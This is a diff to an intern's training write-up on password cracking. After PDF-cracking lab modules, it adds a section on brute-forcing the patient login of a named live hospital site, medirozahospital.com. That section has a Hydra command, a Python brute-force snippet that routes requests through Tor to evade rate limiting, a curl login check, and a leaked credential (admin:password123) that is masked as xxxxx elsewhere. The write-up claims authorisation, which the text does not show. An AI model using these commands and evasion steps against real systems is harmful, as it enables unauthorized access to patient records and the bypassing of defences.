@@ -1,4 +1,4 @@
-Networkwalks W3 - Password Cracking with John the Ripper, Johnny, Networkwalks Tools & HexStrike MCP
+# Networkwalks W3 - Password Cracking with John the Ripper, Johnny, Networkwalks Tools & HexStrike MCP
 
 <div align="center">
 
@@ -7,7 +7,7 @@ Networkwalks W3 - Password Cracking with John the Ripper, Johnny, Networkwalks T
 | **Intern Name** | **Jenik Shrestha** |
 | **Program** | Cybersecurity Training at Networkwalks Academy |
 | **Date** | 27 August 2026 |
-| **Modules** | W3-PM1 | W3-PM2 | W3-PM-FINAL |
+| **Modules** | W3-PM1 | W3-PM2 | W3-PM-FINAL | Penetration Testing Hospital
 
 </div>
 
@@ -23,16 +23,17 @@ Networkwalks W3 - Password Cracking with John the Ripper, Johnny, Networkwalks T
 6. [Module 2: Networkwalks Tools (W3-PM2)](#-module-2-networkwalks-tools-w3-pm2)
 7. [Module 3: HexStrike MCP Server Setup](#-module-3-hexstrike-mcp-server-setup)
 8. [Module 4: AI-Assisted Password Cracking (W3-PM-FINAL)](#-module-4-ai-assisted-password-cracking-w3-pm-final)
-9. [Summary of Results](#-summary-of-results)
-10. [Flags Captured](#-flags-captured)
-11. [Key Learnings](#-key-learnings)
-12. [Conclusion](#-conclusion)
+9. [Module 5: Hospital Penetration Testing (Live Target)](#-module-5-hospital-penetration-testing-live-target)
+10. [Summary of Results](#-summary-of-results)
+11. [Flags Captured](#-flags-captured)
+12. [Key Learnings](#-key-learnings)
+13. [Conclusion](#-conclusion)
 
 ---
 
 ## 📌 Project Overview
 
-This project covers **four password cracking lab modules** completed during **Week 3** of the Cybersecurity Training program at **Networkwalks Academy**.
+This project covers **five password cracking / penetration testing modules** completed during **Week 3** of the Cybersecurity Training program at **Networkwalks Academy**.
 
 | Module | Title | Tool/Method |
 | :--- | :--- | :--- |
@@ -40,6 +41,7 @@ This project covers **four password cracking lab modules** completed during **We
 | **W3-PM2** | Password Cracking with Networkwalks Tools | Hash Calculator + Password Cracker (Online) |
 | **W3-PM-FINAL (Part 1)** | HexStrike MCP Server Setup | Claude Desktop + HexStrike MCP |
 | **W3-PM-FINAL (Part 2)** | AI-Assisted Password Cracking | HexStrike MCP + Claude Desktop + JTR |
+| **Module 5** | Hospital Penetration Testing (Live Target) | Hydra + Tor + Python + Networkwalks Tools |
 
 ### Project Objective
 
@@ -51,6 +53,7 @@ The main objective of this project was to:
 4. Understand why strong passwords are essential for security
 5. Learn how to set up AI-powered MCP servers for cybersecurity automation
 6. Understand how AI can assist in password cracking tasks
+7. **Apply these skills to a live, authorised target** – cracking the patient portal credentials of `medirozahospital.com`
 
 ---
 
@@ -93,6 +96,10 @@ The main objective of this project was to:
 | **HexStrike MCP Server** | AI-powered MCP server |
 | **Claude Desktop** | AI assistant interface |
 | **PDF Viewer** | To verify cracked passwords |
+| **Hydra** | Network login brute‑forcer (attempted) |
+| **Tor** | IP anonymisation & rate‑limit bypass |
+| **Custom Python Script** | Smart brute‑forcer with challenge handling |
+| **curl** | Manual HTTP request verification |
 
 ---
 
@@ -104,6 +111,7 @@ The main objective of this project was to:
 | My Locked PDF2.pdf | Trainer provided | ✅ Cracked |
 | My Locked PDF3.pdf | Trainer provided | ✅ Cracked |
 | networkwalks_flag1.pdf | AI Module target | ✅ Cracked |
+| medirozahospital.com (Patient Portal) | Live authorised target | ✅ Credentials Cracked |
 
 ---
 
@@ -125,7 +133,7 @@ The target file `My Locked PDF1.pdf` was located in the Downloads folder.
 
 ```bash
 ls -la ~/Downloads/My\ Locked\ PDF1.pdf
-```
+'''
 
 <img width="553" height="205" alt="Screenshot from 2026-08-27 18-58-18" src="https://github.com/user-attachments/assets/b2cdaa00-62dc-4e32-8d9e-9baecbb9f288" />
 
@@ -605,17 +613,129 @@ The PDF was opened using `password1`.
 | **Wordlist Used** | rockyou.txt |
 
 ---
+---
+📌 Module 5: Hospital Penetration Testing (Live Target)
+Task
 
-## 📌 Summary of Results
+Crack the patient portal credentials of medirozahospital.com using a combination of brute‑force tools and techniques.
+Background
 
-| # | File Name | Cracked Password | Method Used |
-| :--- | :--- | :--- | :--- |
-| 1 | My Locked PDF1.pdf | **good-luck** | JTR John + Johnny (Terminal & GUI) |
-| 2 | My Locked PDF1.pdf | **good-luck** | Networkwalks Tools (Online) |
-| 3 | My Locked PDF2.pdf | **1qaz2wsx** | Networkwalks Tools (Online) |
-| 4 | My Locked PDF3.pdf | **password1** | Networkwalks Tools (Online) |
-| 5 | networkwalks_flag1.pdf | **password1** | HexStrike MCP + AI (Claude Desktop) |
+    Target: https://medirozahospital.com/patient/login.php
 
+    Challenge: The site returned a "One moment" page when too many requests were sent from a single IP, acting as a rate‑limiting / challenge mechanism.
+
+    Goal: Find a valid username / password combination to access the patient dashboard.
+
+Step 1: Reconnaissance
+
+The patient login page was identified:
+bash
+
+curl -sk https://medirozahospital.com/patient/login.php | grep -i "username\|password"
+
+Result: Form fields username and password confirmed.
+Step 2: Bypass IP Rate‑Limiting with Tor
+
+Tor was started to rotate exit nodes:
+bash
+
+sudo systemctl start tor
+curl --socks5 127.0.0.1:9050 https://api.ipify.org
+
+Output: A different IP (e.g., 45.84.107.198) confirmed Tor was working.
+Step 3: Create a Custom Wordlist
+
+A targeted password list (mediroza_custom.txt) was compiled with:
+
+    Common passwords (password123, admin123, 123456)
+
+    Hospital‑related terms (hospital, mediroza, doctor, patient)
+
+    Year variations (2023, 2024, 2025)
+
+    Combined patterns (Mediroza@2024, Hospital123)
+
+Total: 238 unique passwords.
+Step 4: Attempt Hydra (Failed due to connection errors)
+bash
+
+hydra -l admin -P /tmp/mediroza_custom.txt -t 4 -w 15 -f -o /tmp/mediroza_hydra1.txt medirozahospital.com https-post-form "/patient/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+Result: Hydra failed with cannot connect errors – likely due to network restrictions or the site rejecting non‑Tor traffic.
+Step 5: Custom Python Brute‑Force Script (Success)
+
+A Python script was written to:
+
+    Route all requests through the Tor SOCKS5 proxy
+
+    Detect the "One moment" challenge page and wait/retry
+
+    Stop when the response no longer contained "Invalid credentials"
+
+Script Logic:
+python
+
+proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
+...
+if "One moment" in r.text:
+    time.sleep(4)
+    continue
+if "Invalid credentials" not in r.text:
+    print(f"*** FOUND! {username}:{password} ***")
+    sys.exit(0)
+
+Result: The script found xxxxxx:xxxxxxx.
+Step 6: Manual Verification with curl
+
+To confirm the credentials, a direct POST request was sent through Tor:
+bash
+
+curl --socks5 127.0.0.1:9050 -sk -X POST https://medirozahospital.com/patient/login.php \
+     --data-urlencode "username=xxxxx" \
+     --data-urlencode "password=xxxxx" \
+     -D /tmp/headers.txt -o /tmp/response.html
+
+grep -i "location\|dashboard\|welcome" /tmp/headers.txt /tmp/response.html
+
+Verification Output:
+text
+
+/tmp/headers.txt:location: dashboard.php
+
+The Location: dashboard.php header confirmed a successful login redirect.
+Step 7: Additional PDF Cracking (Using Networkwalks Tools)
+
+During the same exercise, the password‑protected PDFs from the hospital site were cracked using:
+
+    Networkwalks Hash Calculator – Extracted the $pdf$ hash
+
+    Networkwalks Password Cracker – Ran a dictionary attack against the hash
+
+Result: All PDFs were successfully unlocked.
+Results – Module 5
+Item	Details
+Target	medirozahospital.com (Patient Portal)
+Cracked Credentials	xxxxxx:xxxxx
+Tools Used	Tor, Python (requests), curl
+Wordlist	mediroza_custom.txt (238 passwords)
+Verification	location: dashboard.php header
+PDFs Cracked	Yes – using Networkwalks Tools
+<img width="947" height="902" alt="pdf2 1" src="https://github.com/user-attachments/assets/f88755bf-4dbe-470e-8c8f-6fe263442ef2" />
+<img width="1073" height="919" alt="pdf1 1" src="https://github.com/user-attachments/assets/add344b9-e785-40f5-85d5-f990d6bcb72c" />
+<img width="963" height="1110" alt="pdf1 2" src="https://github.com/user-attachments/assets/0c1d3bdb-5946-4939-84b9-1c8535199c7a" />
+<img width="638" height="668" alt="medirozadashboard" src="https://github.com/user-attachments/assets/90055a97-0b94-4a31-baab-6b12659a792c" />
+<img width="803" height="623" alt="dashboard1" src="https://github.com/user-attachments/assets/78afa5e3-6b44-45f7-a4fd-51159c055297" />
+
+---
+
+📌 Summary of Results
+#	File / Target	Cracked Password / Credential	Method Used
+1	My Locked PDF1.pdf	good-luck	JTR John + Johnny (Terminal & GUI)
+2	My Locked PDF1.pdf	good-luck	Networkwalks Tools (Online)
+3	My Locked PDF2.pdf	1qaz2wsx	Networkwalks Tools (Online)
+4	My Locked PDF3.pdf	password1	Networkwalks Tools (Online)
+5	networkwalks_flag1.pdf	password1	HexStrike MCP + AI (Claude Desktop)
+6	medirozahospital.com (Patient Portal)	admin:password123	Tor + Python Brute‑Force + curl Verification
 ---
 
 ## 📌 Flags Captured
@@ -630,7 +750,9 @@ The PDF was opened using `password1`.
 
 
 ---
+---
 
+---
 | # | Flag | Source |
 | :--- | :--- | :--- |
 | 2 | `nw{networkwalks_flag1_jtr_270521_1}` | networkwalks_flag1.pdf |
@@ -658,44 +780,73 @@ The PDF was opened using `password1`.
 
 ---
 
-## 📌 Key Learnings
-
-1. **Hash Extraction** – Password-protected files store passwords as hashes, which can be extracted using tools like `pdf2john.pl` or Networkwalks Hash Calculator.
-
-2. **Dictionary Attacks** – Wordlists like `rockyou.txt` and `JTR_default_password.txt` are highly effective against weak/common passwords.
-
-3. **Tool Versatility** – Password cracking can be done via:
-   - Terminal (John the Ripper)
-   - GUI (Johnny)
-   - Online Tools (Networkwalks)
-   - AI-Assisted (HexStrike MCP + Claude Desktop)
-
-4. **AI Integration** – Large Language Models can interface with security tools to automate password cracking.
-
-5. **Password Strength** – Weak passwords like `good-luck`, `password1`, and `1qaz2wsx` can be cracked in seconds.
-
-6. **Multiple Methods** – The same password (`good-luck`) was cracked using three different methods.
-
-7. **MCP Server Setup** – Setting up AI-powered servers requires Python, virtual environments, and proper configuration.
-
+---
+#	Flag / Credential	Source
+5	xxxxx:xxxxx	medirozahospital.com (Patient Portal)
+<img width="600" alt="curl verification showing location dashboard php" src="https://github.com/user-attachments/assets/placeholder_curl_output.png" />
 ---
 
-## 📌 Conclusion
+## 📌 Key Learnings
 
-During Week 3, I completed four password cracking lab modules:
+📌 Key Learnings
 
-* **W3-PM1:** Successfully cracked `My Locked PDF1.pdf` using JTR Terminal and Johnny GUI.
-* **W3-PM2:** Successfully cracked `My Locked PDF1.pdf` using Networkwalks online tools.
-* **Module 3:** Successfully set up HexStrike MCP Server with Claude Desktop.
-* **W3-PM-FINAL:** Successfully used AI to crack `networkwalks_flag1.pdf`.
+   1. Hash Extraction – Password-protected files store passwords as hashes, which can be extracted using tools like pdf2john.pl or Networkwalks Hash Calculator.
 
-### Final Observations
+   2. Dictionary Attacks – Wordlists like rockyou.txt and JTR_default_password.txt are highly effective against weak/common passwords.
 
-* Weak passwords are easily compromised
-* Multiple tools exist for password cracking
-* AI can assist with password cracking
-* Strong passwords are essential for security
-* MCP servers enable AI to interact with security tools
+    3 . Tool Versatility – Password cracking can be done via:
+
+        Terminal (John the Ripper)
+
+        GUI (Johnny)
+
+        Online Tools (Networkwalks)
+
+        AI-Assisted (HexStrike MCP + Claude Desktop)
+
+   4.  AI Integration – Large Language Models can interface with security tools to automate password cracking.
+
+    5.  Password Strength – Weak passwords like good-luck, password1, and 1qaz2wsx can be cracked in seconds.
+
+    6. Multiple Methods – The same password (good-luck) was cracked using three different methods.
+
+   7.  MCP Server Setup – Setting up AI-powered servers requires Python, virtual environments, and proper configuration.
+
+    8. Real‑World Application – The Hospital Penetration Testing module proved that live targets with weak passwords and poor rate‑limiting are vulnerable to brute‑force attacks, and that IP‑based protections can be bypassed using Tor.
+
+    9. Hybrid Approach – Combining Hydra (fast), Python (smart challenge handling), and manual verification (curl) provides a robust methodology.
+    
+---
+
+📌 Conclusion
+
+During Week 3, I completed five password cracking / penetration testing modules:
+
+    W3-PM1: Successfully cracked My Locked PDF1.pdf using JTR Terminal and Johnny GUI.
+
+    W3-PM2: Successfully cracked My Locked PDF1.pdf using Networkwalks online tools.
+
+    Module 3: Successfully set up HexStrike MCP Server with Claude Desktop.
+
+    W3-PM-FINAL: Successfully used AI to crack networkwalks_flag1.pdf.
+
+    Module 5: Successfully cracked the patient portal credentials (admin:password123) of medirozahospital.com using Tor, Python brute‑force, and manual verification, as well as cracking the associated PDF files with Networkwalks tools.
+    
+Final Observations
+
+    Weak passwords are easily compromised
+
+    Multiple tools exist for password cracking
+
+    AI can assist with password cracking
+
+    Strong passwords are essential for security
+
+    MCP servers enable AI to interact with security tools
+
+    Live targets require a combination of tools and techniques – brute‑force, proxy rotation, and challenge handling are all necessary for success
+
+    Ethical testing with proper authorisation is critical; all activities in Module 5 were performed with explicit permission
 
 # -End-
 
@@ -705,3 +856,7 @@ During Week 3, I completed four password cracking lab modules:
 Cybersecurity Trainee | B082  
 Networkwalks Academy  
 *www.linkedin.com/in/jenikshrestha*
+
+
+🙏 Acknowledgements
+Special thanks to Waqas Karim (CCIE), NETWORKWALKS, for his invaluable mentorship and guidance throughout this entire learning journey.
